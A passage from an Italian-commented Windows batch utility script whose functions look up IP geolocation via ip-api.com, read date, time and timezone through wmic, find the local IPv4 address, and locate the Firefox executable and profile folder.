	ping -a -n 1 -f %PING_this% >nul
	if %errorlevel% GTR 0 (
		set ""ERROR_geoip_no_internet=connessione a internet non disponibile""
		echo\::
		echo\:: connessione a internet non disponibile
		echo\:: [ping -a -n 1 -l 8 -f -w 128 %PING_this%] senza risposta
		echo\::
		call :FOOTER
		exit /b %ERROR%
	)

	:::: REM https://ip-api.com/docs/api:json
	:::: set ""FIELDS=status,message,""
	:::: set ""FIELDS=%FIELDS%continent,continentCode,country,countryCode,region,""
	:::: set ""FIELDS=%FIELDS%regionName,city,district,zip,lat,lon,timezone,offset,currency,""
	:::: set ""FIELDS=%FIELDS%isp,org,as,asname,reverse,mobile,proxy,hosting,query""
	set ""FIELDS=66846719""

	set ""ADDRESS=%~2""
	set ""GEO_IP_API=http://ip-api.com/json/%ADDRESS%?fields=%FIELDS%""
	REM set ""CURL_exe=%CURL_exe% -v -s -S -k -L --retry 1 -A ""%THIS_file:~0,-4%""""
	set ""CURL_exe=%CURL_exe% -s -S -k -L --retry 1 -A ""%THIS_file:~0,-4% %THIS_file_pid%""""
	echo\:: %CURL_EXE% %GEO_IP_API%
	echo\:: valori restituiti:... .. .
	::::::::::::
	for /f ""tokens=*"" %%A in ( '""%CURL_exe% %GEO_IP_API%""' ) do (
		REM if !errorlevel! GTR 0 (
			REM set ""ERROR_geoip_curl=errore curl""
			REM echo\::
			REM echo\:: errore curl
			REM echo\::
			REM call :FOOTER
			REM exit /b %ERROR%
		REM )
		REM	echo\ A=""%%~A""
		set ""geo_ip=%%~A""
		set ""geo_ip=!geo_ip:{=!""
		set ""geo_ip=!geo_ip:}=!""
		set ""geo_ip=!geo_ip:"":==!""
		set ""geo_ip=!geo_ip:""=!""
		set ""geo_ip=!geo_ip:, =##!""
	)
	REM echo\ ---- GEO_IP ----
	REM echo\%geo_ip:,=!lf!%
	for /f ""tokens=1,2 delims=^="" %%a in ( ""%geo_ip:,=!LF!%"" ) do (
		set ""A=%%a""
		set ""B=%%b""
		if defined TR_exe (
			for /f ""tokens=*"" %%Z in ( 'echo\!A!^|""%TR_exe%"" [:lower:] [:upper:]') do (
				set ""A=%%Z""
			)
		)
		if /i ""!A!""==""status"" (
			if ""!B!""==""fail"" (
				set ""ERROR_geoip_status=ip-api.com errore !B!""
			)
		)
		if defined ERROR_geoip_status (
			if ""!B!"" NEQ ""fail"" set ""ERROR_geoip_!A!=ip-api.com errore !B!""
		)
		if not defined ERROR_geoip_status (
			REM if not defined B set ""B=""""""
			if not defined B set ""B=_NUL_""
			set ""_!A!=!B:##=, !""
		)
	)
	set ""A=""
	set ""B=""

	if defined ERROR_geoip_status (
		call :FOOTER
		exit /b %ERROR%
	)

	if not defined ADDRESS set ""ADDRESS=local_%_query%""
	echo\::::::::::::::::::::::::::::::::::::::::
	for /f ""tokens=*"" %%z in ( 'set _' ) do echo\:: my_%ADDRESS%%%z
	echo\::::::::::::::::::::::::::::::::::::::::
	echo\::%MSG:§=!LF!::%
	call :FOOTER
	set ""N=""
	for /f ""tokens=1,2 delims=^="" %%G in ('set _') do (
		set /a N+=1
		if !N! EQU 1 ( 
			REM endlocal & endlocal
			endlocal
		)
		set ""my_%ADDRESS%%%G=%%H""
	)
	set ""N=""

:geoip_end
:::::::::::::: my_geoip end ::::::::::::::::::::::::::::::::::::::::::
:::::::::::::: my_geoip end ::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::: my_date ::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::: my_date ::::::::::::::::::::::::::::::::::::::::::::::::::
goto :my_date_end
:my_date
REM setlocal enabledelayedexpansion
:MY_DATE_sos
if not ""%~0""=="":MY_DATE_sos"" goto :my_date_sos_end
	call ""%THIS_file_full_path%"" my_date >""%temp%\%~1.txt""
	set ""N=""
	for /f ""tokens=*"" %%Z in ('type ""%temp%\%~1.txt""') do (
		set ""Zx=%%Z""
		echo\!Zx! | findstr /x /r /c:""^[:][:][ ][m][y][_].*$"" >nul 2>&1
		if !errorlevel! EQU 0 (
			set /a N+=1
			if !N! EQU 1 (
				echo\::* %THIS_file% %C__%%~1%C_0% .
				echo\::
				echo\::  restituisce queste variabili... .. .
				echo\!Zx!
			) else (
				echo\!Zx!
			)
		)
	)
	set ""N=""
	del /q ""%temp%\%~1.txt""
	exit /b %ERROR%
	REM call ""%THIS_file_full_path%"" my_date >nul
	REM echo\::*""%THIS_file%"" %1
	REM echo\::  return my_DATE=%my_DATE%
	REM echo\::         my_DATE_serial=%my_DATE_serial%
	REM echo\::         my_TIME=%my_TIME%
	REM echo\::         my_TIME_serial=%my_TIME_serial%
	REM echo\::         my_YEAR=%my_YEAR%
	REM echo\::         my_MONTH_N=%my_MONTH_N%
	REM echo\::         my_MONTH_NAME=%my_MONTH_NAME%
	REM echo\::         my_DAY_IN_MONTH=%my_DAY_IN_MONTH%
	REM echo\::         my_QUARTER_IN_YEAR=%my_QUARTER_IN_YEAR%
	REM echo\::         my_WEEK_IN_MONTH=%my_WEEK_IN_MONTH%
	REM echo\::         my_DAY_OF_WEEK=%my_DAY_OF_WEEK%
	REM echo\::         my_DAY_NAME=%my_DAY_NAME%
	REM echo\::         my_HOUR=%my_HOUR%
	REM echo\::         my_MINUTE=%my_MINUTE%
	REM echo\::         my_SECOND=%my_SECOND%
	REM echo\::         my_SECOND_CENT=%my_SECOND_CENT%
	REM exit /b %ERROR%
:my_date_sos_end

REM for /f ""tokens=1-5 delims= "" %%a in ( 'wmic path win32_localtime get day^,dayofweek^,month^,year ^| findstr /R [0-9]' ) do (
	REM set DAY=%%a
	REM set DAY_OF_WEEK=%%b
	REM set MONTH_N=%%c
	REM set YEAR=%%d
REM )
:::: https://superuser.com/questions/331220/wmic-path-what-wmic-class-what
REM wmic path Win32_TimeZone get /format:list
REM wmic path Win32_UTCTime get /format:list

	wmic path win32_localtime get /format:list >nul 2>&1
	if %errorlevel% EQU 0 (
		set ""COUNT_all_wmic=""
		for /f ""tokens=1,2 delims=^="" %%A in ('wmic path win32_localtime get /format:list') do (
			set /a COUNT_all_wmic+=1
			REM set ""_%%A=%%B""
			REM REM @echo\ A--[ %%A ] B--[ %%B ]
			REM set /a COUNT_all+=1
			set ""Ax=%%A""
			set ""Bx=%%B""
			REM echo\---- 'Ax=!Ax!'  'Bx=!Bx!'
			REM :::: controllo se !Bx! è vuoto
			REM :::: Milliseconds= non
			if not !Bx!dummy==dummy (
				REM :::: imposto solo !Bx! con valore
				REM echo\:: valore valido !Ax!=!Bx!
				set ""!Ax!=!Bx!""
			)
		)
	) else (
		set ""ERROR_win32_localtime=wmic path win32_localtime""
	)

	if defined Year (
		set ""_YEAR=%Year%""
	) else (
		set ""ERROR_my_date_YEAR=Non trovo l'anno""
	)

	if defined Month (
		if %Month%==1 set ""_MONTH_NAME=gennaio""
		if %Month%==2 set ""_MONTH_NAME=febbraio""
		if %Month%==3 set ""_MONTH_NAME=marzo""
		if %Month%==4 set ""_MONTH_NAME=aprile""
		if %Month%==5 set ""_MONTH_NAME=maggio""
		if %Month%==6 set ""_MONTH_NAME=giugno""
		if %Month%==7 set ""_MONTH_NAME=luglio""
		if %Month%==8 set ""_MONTH_NAME=agosto""
		if %Month%==9 set ""_MONTH_NAME=settembre""
		if %Month%==10 set ""_MONTH_NAME=ottobre""
		if %Month%==11 set ""_MONTH_NAME=novembre""
		if %Month%==12 set ""_MONTH_NAME=dicembre""
		if ""%Month:~1,1%""=="""" (
			set ""_MONTH_N=0%Month%""
		) else (
			set ""_MONTH_N=%Month%""
		)
	) else (
		set ""ERROR_my_date_Month=Non trovo il mese""
	)
	if defined DayOfWeek (
		if %DayOfWeek%==0 set ""_DAY_NAME=domenica""
		if %DayOfWeek%==1 set ""_DAY_NAME=lunedì""
		if %DayOfWeek%==2 set ""_DAY_NAME=martedì""
		if %DayOfWeek%==3 set ""_DAY_NAME=mercoledì""
		if %DayOfWeek%==4 set ""_DAY_NAME=giovedì""
		if %DayOfWeek%==5 set ""_DAY_NAME=venerdì""
		if %DayOfWeek%==6 set ""_DAY_NAME=sabato""
		if %DayOfWeek%==7 set ""_DAY_NAME=domenica""
		if ""%DayOfWeek:~1,1%""=="""" (
			set ""_DAY_OF_WEEK=0%DayOfWeek%""
		) else (
			set ""_DAY_OF_WEEK=%DayOfWeek%""
		)
	) else (
		set ""ERROR_my_date_DayOfWeek=Non trovo il giorno della settimana""
	)
	if defined Quarter (
		set ""_QUARTER_IN_YEAR=%Quarter%""
	) else (
		set ""ERROR_my_date_QUARTER_IN_YEAR=Non trovo il quadrimestre""
	)
	if defined WeekInMonth (
		set ""_WEEK_IN_MONTH=%WeekInMonth%""
	) else (
		set ""ERROR_my_date_WEEK_IN_MONTH=Non trovo la settimana nel mese""
	)
	if defined Day (
		if ""%Day:~1,1%""=="""" (
			set ""_DAY_IN_MONTH=0%Day%""
		) else (
			set ""_DAY_IN_MONTH=%Day%""
		)
	) else (
		set ""ERROR_my_date_DAY_IN_MONTH=Non trovo il giorno del mese""
	)

	REM :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
	REM wmic path Win32_TimeZone get /format:list
	REM Bias=60
	REM Caption=(UTC+01:00) Amsterdam, Berlino, Berna, Roma, Stoccolma, Vienna
	REM DaylightBias=-60
	REM DaylightDay=5
	REM DaylightDayOfWeek=0
	REM DaylightHour=2
	REM DaylightMillisecond=0
	REM DaylightMinute=0
	REM DaylightMonth=3
	REM DaylightName=ora legale Europa occidentale
	REM DaylightSecond=0
	REM DaylightYear=0
	REM Description=(UTC+01:00) Amsterdam, Berlino, Berna, Roma, Stoccolma, Vienna
	REM SettingID=
	REM StandardBias=0
	REM StandardDay=5
	REM StandardDayOfWeek=0
	REM StandardHour=3
	REM StandardMillisecond=0
	REM StandardMinute=0
	REM StandardMonth=10
	REM StandardName=ora solare Europa occidentale
	REM StandardSecond=0
	REM StandardYear=0
	REM :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
	wmic path Win32_TimeZone get /format:list >nul 2>&1
	if %errorlevel% EQU 0 (
		set ""COUNT_all_wmic=""
		REM for /f ""tokens=1,2 delims=^="" %%A in ('wmic path Win32_TimeZone get Description /format:list') do (
		for /f ""tokens=1,2 delims=^="" %%A in ('wmic path Win32_TimeZone get /format:list') do (
			set /a COUNT_all_wmic+=1
			REM set ""_%%A=%%B""
			REM REM @echo\ A--[ %%A ] B--[ %%B ]
			REM set /a COUNT_all+=1
			set ""Ax=%%A""
			set ""Bx=%%B""
			REM echo\---- 'Ax=!Ax!'  'Bx=!Bx!'
			REM :::: controllo se !Bx! è vuoto
			REM :::: Milliseconds= non
			if not !Bx!dummy==dummy (
				REM if defined TR_UPPER (
					REM for /f ""tokens=*"" %%Z in ( 'echo\!Ax!^|%TR_UPPER%') do (
					REM set ""Ax=%%Z""
					REM echo\@@@@@@@@@!Ax!
					REM )
				REM )
			
				REM :::: imposto solo !Bx! con valore
				REM echo\:: valore valido !Ax!=!Bx!
				set ""!Ax!=!Bx!""
			)
		)
	) else (
		set ""ERROR_Win32_TimeZone=wmic path Win32_TimeZone""
	)
	if defined Description (
		set ""_TIME_Description=%Description%""
	) else (
		set ""ERROR_TimeZone_Description=non trovo la descrizione di TimeZone""
	)
	if defined StandardName (
		set ""_TIME_StandardName=%StandardName%""
	) else (
		set ""ERROR_TimeZone_StandardName=non trovo StandardName di TimeZone""
	)
	if defined DaylightName (
		set ""_TIME_DaylightName=%DaylightName%""
	) else (
		set ""ERROR_TimeZone_DaylightName=non trovo DaylightName di TimeZone""
	)

	REM :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
	REM wmic path Win32_UTCTime get /format:list
	REM Day=4
	REM DayOfWeek=4
	REM Hour=12
	REM Milliseconds=
	REM Minute=26
	REM Month=4
	REM Quarter=2
	REM Second=7
	REM WeekInMonth=1
	REM Year=2024
	REM :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
	wmic path Win32_UTCTime get /format:list >nul 2>&1
	if %errorlevel% EQU 0 (
		set ""COUNT_all_wmic=""
		for /f ""tokens=1,2 delims=^="" %%A in ('wmic path Win32_UTCTime get /format:list') do (
			set /a COUNT_all_wmic+=1
			REM set ""_%%A=%%B""
			REM REM @echo\ A--[ %%A ] B--[ %%B ]
			REM set /a COUNT_all+=1
			set ""Ax=%%A""
			set ""Bx=%%B""
			REM echo\---- 'Ax=!Ax!'  'Bx=!Bx!'
			REM :::: controllo se !Bx! è vuoto
			if not !Bx!dummy==dummy (
				REM :::: imposto solo !Bx! con valore
				REM echo\:: valore valido !Ax!=!Bx!
				set ""!Ax!=!Bx!""
			)
		)
	) else (
		set ""ERROR_Win32_UTCTime=wmic path Win32_UTCTime""
	)
	if defined Day (
		if ""%Day:~1,1%""=="""" (
			set ""_UTC_DAY_IN_MONTH=0%Day%""
		) else (
			set ""_UTC_DAY_IN_MONTH=%Day%""
		)
	)
	if defined DayOfWeek (
		if ""%DayOfWeek:~1,1%""=="""" (
			set ""_UTC_DAY_OF_WEEK=0%DayOfWeek%""
		) else (
			set ""_UTC_DAY_OF_WEEK=%DayOfWeek%""
		)
	)
	if defined Month (
		if ""%Month:~1,1%""=="""" (
			set ""_UTC_MONTH_N=0%Month%""
		) else (
			set ""_UTC_MONTH_N=%Month%""
		)
	)
	if defined Year (
		set _UTC_YEAR=%Year%
	)
	if defined Hour (
		if ""%Hour:~1,1%""=="""" (
			set ""_UTC_HOUR=0%Hour%""
		) else (
			set ""_UTC_HOUR=%Hour%""
		)
	)
	if defined Minute (
		if ""%Minute:~1,1%""=="""" (
			set ""_UTC_MINUTE=0%Minute%""
		) else (
			set ""_UTC_MINUTE=%Minute%""
		)
	)
	if defined Second (
		if ""%Second:~1,1%""=="""" (
			set ""_UTC_SECOND=0%Second%""
		) else (
			set ""_UTC_SECOND=%Second%""
		)
	)
	set ""_UTC_TIME=%_UTC_HOUR%:%_UTC_MINUTE%:%_UTC_SECOND%""
	set ""_UTC_DATE=%_UTC_DAY_IN_MONTH%/%_UTC_MONTH_N%/%_UTC_YEAR%""
	
	
	set ""_DATE_serial=%_YEAR%%_MONTH_N%%_DAY_IN_MONTH%""
	REM echo\@@@ _DATE_serial=%_DATE_serial%

	REM ""wmic path win32_localtime get /format:list"" non inizializza Milliseconds, non considera i centesimi di sec
	REM PRENDO I VALORI DA %time% e %date%
	REM PER VALORIZZARE _TIME_serial _DATE_serial ... .. .  .   .     .
	REM formato localizzato della data da ""reg import myregPARETO-User.reg""
	REM reg query ""HKCU\Control Panel\International""
	REM reg query ""HKCU\Control Panel\International"" /v sDecimal
	
	set ""_CURRENT_date=%date%§%time: =0%"" & REM spazi vuoti diventano ""0""
	REM echo %_CURRENT_date%
	for /f ""tokens=1-8 delims=/:,§"" %%a in (""%_CURRENT_date%"") do (
		REM echo  %%cYEAR %%bMONTH %%aDAY
		REM echo  %%dHOURS %%eMIN %%fSEC %%gCENTs
		REM set ""_Year=%%c""
		REM set ""_Month=%%b""
		REM set ""_Day=%%a""
		set ""_HOUR=%%d""
		set ""_MINUTE=%%e""
		set ""_SECOND=%%f""
		set ""_SECOND_CENT=%%g""
		REM set ""_DATE_serial=%%c%%b%%a""
		REM set ""_TIME_serial=%%d%%e%%f%%g""
	)
	set ""_CURRENT_date=""
	set ""_TIME_serial=%_HOUR%%_MINUTE%%_SECOND%%_SECOND_CENT%""

	set ""_DATE=%_DAY_NAME% %Day% %_MONTH_NAME% %_YEAR%""
	set ""_TIME=%_HOUR%:%_MINUTE%:%_SECOND%,%_SECOND_CENT%""
	REM echo\@@@_DATE==%_DATE%
	REM echo\@@@_TIME==%_TIME%
	REM echo ""%~dpnx0"" %1
	echo\:: %THIS_file% %C__%%~1%C_0% .
	echo\::
	echo\:: valori restituiti... .. .
	echo\::::::::::::::::::::::::::::::::::::::::
	for /f ""tokens=1,2 delims=^="" %%A in ( 'set _' ) do (
		set Az=
		set Bz=
		set ""Az=%%A""
		set ""Bz=%%B""
		echo\:: my!Az!=!Bz!
	)
	echo\::::::::::::::::::::::::::::::::::::::::
	echo\::%MSG:§=!LF!::%
	call :FOOTER
	set ""N=""
	for /f ""tokens=1,2 delims=^="" %%G in ('set _') do (
		set /a N+=1
		REM if ""!N!"" EQU ""1"" endlocal & endlocal
		if ""!N!"" EQU ""1"" endlocal
		set ""my%%G=%%H""
	)
	set ""N=""
:my_date_end
:::::::::::::: my_date end ::::::::::::::::::::::::::::::::::::::::::
:::::::::::::: my_date end ::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::: my_ip4 :::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::: my_ip4 :::::::::::::::::::::::::::::::::::::::::::::::::::
goto :my_IP4_end
:my_IP4
REM setlocal enabledelayedexpansion
:MY_IP4_sos
if not ""%~0""=="":MY_IP4_sos"" goto :my_ip4_sos_end
	echo\::* %THIS_file% %C__%%~1%C_0% %C__%to_file%C_0% .
	echo\::
	echo\::  Con il parametro ""to_file"" l'output
	echo\::  é salvato nel file ""%USERPROFILE%\myIP4.txt""
	echo\:: -se disponibile l'indirizzo ip4 imposta la var ""my_ip4""
	echo\::    esce con %%errorlevel%%=0
	echo\:: -se non è disponibile l'indirizzo ip4
	echo\::    esce con %%errorlevel%%^>=1
exit /b %ERROR%
:my_ip4_sos_end

	set ""IP4output=%USERPROFILE%\myIP4.txt""
	if /i ""%~2""==""to_file"" set ""%~2=%IP4output%""
	REM set ""output=%USERPROFILE%\myIP4.txt""
	:: il file  di output viene usato da ""%myscripts%\bginfo\myBgInfo.cmd""
	:: per generare l'immagine per il deskTop

	set ""IP4=-""
	REM grep -E -o ""([0-9]{1,3}[\.]){3}[0-9]{1,3}""
	REM grep -E ""([0-9]{1,3}[\.]){3}[0-9]{1,3}""
	REM for /f ""usebackq tokens=1-2* delims=:"" %%a in (`ipconfig ^| findstr /i /r /c:""ipv4[. : ]*[0-9]""`) do set ""IP4=-%%b!IP4: =!""
	for /f ""usebackq tokens=1-2* delims=:"" %%a in (`ipconfig ^| findstr /i /r /c:""ipv4[. : ]*[0-9]*[.][0-9]*[.][0-9]*[.][0-9]*$""`) do (
		set ""IP4=!IP4!%%b -""
	)

	if ""%IP4%""==""-"" set ""IP4=-x.x.x.x IP4 NON DISPONIBILE-"" & set ""ERROR_IP4=x.x.x.x IP4 NON DISPONIBILE""
	:: tutto su una riga senza CR-LF
	if defined to_file echo\ | set /p ""IP4=%IP4%"" > ""%IP4output%""

	REM echo\:: %THIS_file% %C__%%~1%C_0% .
	REM echo\:: return my_IP4=%IP4%
	if not defined to_file (
		echo\:: %THIS_file% %C__%%~1%C_0% .
		echo\::
		echo\:: return my_IP4=%IP4%
		echo\::  ^|
		echo\::  ^|con il parametro ""to_File""
		echo\::  ^| ""%THIS_file%"" my_IP4 to_File
		echo\::  ^|l'output viene salvato nel file
		echo\::  ^|""%IP4output%""
	)
	if defined to_file (
		echo\:: %THIS_file% %C__%%~1%C_0% %C__%to_file%C_0% .
		echo\::
		echo\:: return my_IP4=%IP4%
		echo\::  ^|output salvato nel file. 
		echo\::  ^|""%IP4output%""
	)
	echo\::::::::::::::::::::::::::::::::::::::::
	echo\::%MSG:§=!LF!::%
	call :FOOTER
( 
	REM endlocal & endlocal
	endlocal
	set ""my_IP4=%IP4%""
	exit /b %ERROR%
)
:my_IP4_end
:::::::::::::: my_ip4 end :::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::: my_ip4 end :::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::: dov'é firefox?? ::::::::::::::::::::::::::::::::::::::::::
:::::::::::::: dov'é firefox?? ::::::::::::::::::::::::::::::::::::::::::
goto :WHERE_IS_FF_end
:WHERE_IS_FF
REM setlocal enabledelayedexpansion
:WHERE_IS_FF_sos
if not ""%0""=="":WHERE_IS_FF_sos"" goto :WHERE_IS_FF_sos_end
	echo\::* %THIS_file% %C__%%~1%C_0% .
	echo\::
	echo\::  Cerca ""firefox.exe"" nei percorsi d'installazione.
	for /f ""tokens=1,2 delims=^="" %%A in ( 'set program' ) do (
		echo\::        %%%%A%%==""%%B""
	)
	echo\:: Cerca la directory predefinita dei profili
	echo\::  per l'utente ""%USERNAME%"" che esegue questo script
	echo\:: -In caso positivo imposta le var
	echo\::      my_FIREFOX_exe_PATH
	echo\::      my_FIREFOX_PATH
	echo\::      my_FIREFOX_PROFILES
	echo\::  ed esce con %%errorlevel%%=0
	echo\:: -In caso negativo esce con %%errorlevel%%^>=1
	
exit /b %ERROR%
:WHERE_IS_FF_sos_end

	set ""FIREFOX_exe_PATH=""
	set ""FIREFOX_PATH=""
	set ""FIREFOX_PROFILES=""
	set ""FIREFOX_exe=firefox.exe""

	if exist ""%ProgramFiles%\Mozilla Firefox\%FIREFOX_exe%"" (
		set ""FIREFOX_exe_PATH=%ProgramFiles%\Mozilla Firefox\%FIREFOX_exe%""
		set ""FIREFOX_PATH=%ProgramFiles%\Mozilla Firefox\""
	) else (
		echo\ attendi, cerco ...""%FIREFOX_exe%"" nei percorsi d'installazione
	)

	if not defined FIREFOX_exe_PATH (
		for /F ""tokens=2 delims=^="" %%A in ( '@set ProgramFiles' ) do (
			echo\ ""%%A""
			for /f ""tokens=*"" %%G in ('where /r ""%%A"" %FIREFOX_exe% ^2^>nul') do (
				echo\ ""%%G""
				set ""FIREFOX_exe_PATH=%%~fG""
				set ""FIREFOX_PATH=%%~dpG""
			)
		)
	)

	if not defined FIREFOX_exe_PATH (
		if ""%ProgramW6432%""==""%ProgramFiles%"" (
			goto :where_is_FF00
		 )
	)
	if not defined FIREFOX_exe_PATH (
		for /f ""tokens=*"" %%M in ('where /r ""%ProgramW6432%"" %FIREFOX_exe% ^2^>nul') do (
			set ""FIREFOX_exe_PATH=%%~fM""
			set ""FIREFOX_PATH=%%~dpM""
		)
	)

	:where_is_FF00
	if not defined FIREFOX_exe_PATH (
		set ""ERROR_firefox_path=nei percorsi d'installazione dei programmi § ""%FIREFOX_exe%"" non c'é""
	)

	if defined FIREFOX_exe_PATH (
		set ""my_FIREFOX_PATH=%FIREFOX_PATH%""
		set ""my_FIREFOX_exe_PATH=%FIREFOX_exe_PATH%""
		echo\:: return my_FIREFOX_PATH=""!FIREFOX_PATH!""
		echo\::        my_FIREFOX_exe_PATH=""!FIREFOX_exe_PATH!""
		if exist ""%appdata%\mozilla\firefox\profiles.ini"" (
			set ""my_FIREFOX_PROFILES=%appdata%\mozilla\firefox\""
			echo\::        my_FIREFOX_PROFILES=""!my_FIREFOX_PROFILES!""
			echo\::::::::::::::::::::::::::::::::::::::::
			echo\::%MSG:§=!LF!::%
		)
	) else (
		if exist ""%appdata%\mozilla\firefox\profiles.ini"" (
			set ""FIREFOX_PROFILES=%appdata%\mozilla\firefox\""
			echo\::::::::::::::::::::::::::::::::::::::::
			echo\::  Trovati profili personali di ""%USERNAME%"" in
			echo\::  ""!FIREFOX_PROFILES!""
		)
	)

	call :FOOTER

(
	REM endlocal & endlocal
	endlocal
	set ""my_FIREFOX_exe_PATH=%my_FIREFOX_exe_PATH%""
	set ""my_FIREFOX_PATH=%my_FIREFOX_PATH%""
	set ""my_FIREFOX_PROFILES=%my_FIREFOX_PROFILES%""
	exit /b %ERROR%
)
:WHERE_IS_FF_end
:::::::::::::: dov'é firefox?? fine :::::::::::::::::::::::::::::::::::::::::
:::::::::::::: dov'é firefox?? fine :::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::




::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::: Etichette attive solo se richamate da CALL :::::::::::::::::::::::
:HEADER
if not ""%~0""=="":HEADER"" goto :HEADER_end
REM setlocal enabledelayedexpansion
	echo\-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
	REM echo\""%THIS_file_full_path%"" D=""%THIS_file_date%"" Z=""%THIS_file_size%""
	echo\ %THIS_file_full_path% %ALL_0arg%
	echo\         start %TIME_start%
	echo\-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
	if not ""%~1""=="""" (
		echo\  %~1
		echo\::::::::::::::::::::::::::::::::::::::::
	)
	for /f ""tokens=1,2 delims=^="" %%a in ( '""set ERROR_ 2>nul""' ) do (
		echo\%C_RED% [%%a] %C_0%%%b
	)
	echo\::::::::::::::::::::::::::::::::::::::::
REM endlocal
goto :EOF
:HEADER_end

:FOOTER
if not ""%~0""=="":FOOTER"" goto :FOOTER_end
	REM setlocal enabledelayedexpansion
	REM echo\""%~0"" %~1
	echo\::::::::::::::::::::::::::::::::::::::::
	REM set ERROR_
	for /f ""tokens=1,2 delims=^="" %%A in ( '""@set ERROR_ 2>nul""' ) do (
		set /a ERROR+=1
		set ""X=%%B""
		REM echo\ %C_RED%[%%A]%C_0% %%B
		REM echo\ %C_RED%[%%A]%C_0% !X:$=%LF%!
		echo\ %C_RED%[%%A]%C_0% !X!
	)
	if not defined ERROR (
		set ERROR=0
		REM echo\::%MSG:§=!LF!::%
		REM echo\:: visualizza con il comando ""set my_""
		REM echo\::  Questa riga di comando resetta-elimina tutte le var ""my_""
		REM echo\::  impostate da questo script ""%THIS_file%"" %ALL_0arg%
		REM echo\for /f ""delims=^="" %%A in ^('@set my_'^) do @set ""%%A=""
	)
	set ""TIME_end=%time%""
	echo\-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
	echo\ %THIS_file_full_path% %ALL_0arg%
	if %ERROR% GTR 0 echo\ %C_RED%EXIT errorlevel%C_0%=%ERROR%
	echo\  Avviato alle %TIME_start%
	echo\     Fine alle %TIME_end%
	echo\-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
	echo\-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
	chcp %CHCP_OLD% > nul
	endlocal
	exit /b !ERROR!
:FOOTER_end

:SOS_all
if not ""%~0""=="":SOS_all"" goto :SOS_all_end
	REM setlocal enabledelayedexpansion
	echo\::-Questo file ""%THIS_file_full_path%""
	echo\:: contiene funzioni indipendenti e restituiscono variabili
	echo\:: che iniziano con ""my_"" visualizzabili con ""set my_"".
	echo\::-Per ogni funzione è disponibile un'aiuto  
	echo\:: richiamabile con ""[-h|/h|-?|/?]"" seguito dal nome della funzione.
	echo\::-Le funzioni disponibili sono elencate qui sotto:
	echo\::
	set /a N=0
	for /f ""tokens=*"" %%A in ( 'findstr /r /x /c:""^[:][A-Z_0-9].*_sos$"" ""%THIS_file_full_path%""' ) do (
		set /a N+=1
		set ""X=%%A""
		set ""X=!X::=!""
		set ""X=!X:_sos=!""
		REM echo\@@@!N!- %%A - !X!
		if ""!N!"" EQU ""4"" (
			set ""Xz=!Xz! - !X! §""
			set /a N=0
		) else (
			set ""Xz=!Xz! - !X!""
		)
	)
	echo\::   %Xz:§=!LF!::   % & set ""N="" & set ""X="" & set ""Xz=""
	echo\::
	echo\::-""%THIS_file_full_path%"" [-h^|/h^|-?^|/?] %C__%all%C_0%  .
	echo\:: Visualizza l'aiuto per tutte le funzioni
	echo\::::::::::::::::::::::::::::::::::::::::
	echo\::---------
	echo\:: %MSG:§=!LF!:: %
	echo\::---------
	echo\::::::::::::::::::::::::::::::::::::::::
	echo\::::::::::da fare o migliorare::::::::::
	
	REM echo\
	REM echo\* ""%THIS_file%"" where_is_ff
	REM echo\* ""%THIS_file%"" my_date
	REM echo\*^|""%THIS_file%"" my_ip4 to_file
	REM echo\ ^|  con il parametro ""to_file"" l'output
	REM echo\ ^|  é salvato nel file ""%USERPROFILE%\myIP4.txt""
	REM echo\
	REM echo\
	REM echo\* ""%THIS_file%"" user_is_admin
	REM echo\
	REM echo\*^|""%THIS_file%"" run_as_admin
	REM echo\ ^|  %%2=""path al file da eseguire come Administrators""
	REM echo\ ^|  %%3=""eventuali parametri da passare""
	REM echo\ ^|  Spazi vuoti devono essere racchiusi tra "" ""
	REM echo\
	REM echo\*^|""%THIS_file%"" time_elapsed %%2 ""%%3""
	REM REM set ""pat=[-:,.|;#\/]""
	REM REM echo\echo %time%x ^| findstr /i /r /c:""[ 0-9][0-9]!pat![0-9][0-9]!pat![0-9][0-9]!pat![0-9][0-9]""
	REM REM echo\%time% | findstr /i /r /c:[ 0-9][0-9]!!pat!![0-9][0-9]!pat![0-9][0-9]!pat![0-9]*$ & echo error=%errorlevel%
	REM echo\ ^|  %%2=TS oppure TE indica come considerare %%3
	REM echo\ ^|     TS TIME start considera %%3 come ""%%time%%"" di avvio
	REM echo\ ^|     TE TIME end   considera %%3 come ""%%time%%"" di fine
	REM echo\ ^|""%THIS_file%"" time_elapsed CALC
	REM echo\ ^|  Calcola la differenza tra TS ""%%time%%"" e TE ""%%time%%""
	REM echo\ ^|  Restituisce le var:
	REM echo\ ^| .......................................
	REM REM echo\::%THIS_file% exit %%errorlevel%%==0 tutto OK
	REM REM echo\::%THIS_file% exit %%errorlevel%%=^>1 ERRORE
